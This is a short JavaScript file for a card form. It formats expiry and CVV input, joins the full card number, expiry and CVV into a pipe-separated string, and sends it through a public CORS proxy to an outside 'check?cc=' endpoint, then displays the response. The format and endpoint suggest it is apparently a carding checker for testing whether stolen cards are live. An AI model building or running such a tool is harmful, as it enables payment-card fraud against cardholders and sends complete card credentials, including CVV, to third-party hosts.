const cardnumber = document.getElementById('card-number');
// Card number formatting (group by 4)
// cardnumber.addEventListener('input', function (e) {
//     let value = e.target.value.replace(/\D/g, '');
//     if (value.length > 19) {
//         value = value.substring(0, 19);
//     }
//     let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();

//     // Caret position maintain karna
//     let cursor = e.target.selectionStart;
//     e.target.value = formattedValue;
//     e.target.setSelectionRange(cursor, cursor);
// });

const expity = document.getElementById('expiry');
expity.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) {
        value = value.substring(0, 4);
    }

    if (value.length >= 3) {
        value = value.substring(0, 2) + '/' + value.substring(2);
    }
    e.target.value = value;
});

const cnhg = document.getElementById('cvv');
cnhg.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) {
        value = value.substring(0, 4);
    }
    e.target.value = value;
});

const showresult = document.querySelector("#result h3");
const submitwae = document.querySelector("#submitwae");

// API call (via CORS proxy)
// API call (via CORS proxy)
async function checkCard_GET(cardNum) {
    const url = `https://brandnew-lyart.vercel.app/check?cc=${encodeURIComponent(cardNum)}`;
    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;

    try {
        showresult.textContent = "Checking...";
        const res = await fetch(proxyUrl);
        const text = await res.text();

        showresult.textContent = text || "No response.";
    } catch (err) {
        showresult.textContent = `Error: ${err}`;
    }
}



// Build payload and send
function cardinput(cardNum, expiry, cvv) {
    // expiry is like "MM|YYYY"
    let payload = `${cardNum.replace(/\s+/g, '')}|${expiry}|${cvv}`;
    checkCard_GET(payload);
}

// Auto test
// checkCard_GET('5555555555554444|10|2026|123');

submitwae.addEventListener("click", (e) => {
    e.preventDefault();

    if (cardnumber.value === "" || expity.value === "" || cnhg.value === "") {
        showresult.textContent = "Please fill all card fields.";
        return;
    }

    let cary = cardnumber.value.trim().replace(/\s+/g, '');
    let [m, y] = expity.value.trim().split('/');
    if (y.length === 2) y = '20' + y;
    let expFormatted = `${m}|${y}`;
    let cnhgd = cnhg.value.trim();

    cardinput(cary, expFormatted, cnhgd);
});
